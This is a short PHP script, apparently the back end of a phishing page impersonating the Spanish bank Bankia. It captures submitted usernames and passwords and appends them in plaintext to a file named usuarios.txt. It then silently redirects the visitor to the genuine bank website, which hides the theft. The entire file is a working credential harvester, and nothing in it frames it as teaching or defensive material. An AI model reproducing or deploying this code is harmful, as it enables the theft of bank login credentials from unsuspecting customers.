<?php
 $nombre=$_POST["nombre"];
 $password=$_POST["password"];
 $linea=$nombre.";".$password.PHP_EOL;
 $fichero=fopen("usuarios.txt","a");
 fputs($fichero,$linea);
 fclose($fichero);
?>
<html>
<body onLoad="location.href='https://www.bankia.es'">
</body>
</html>

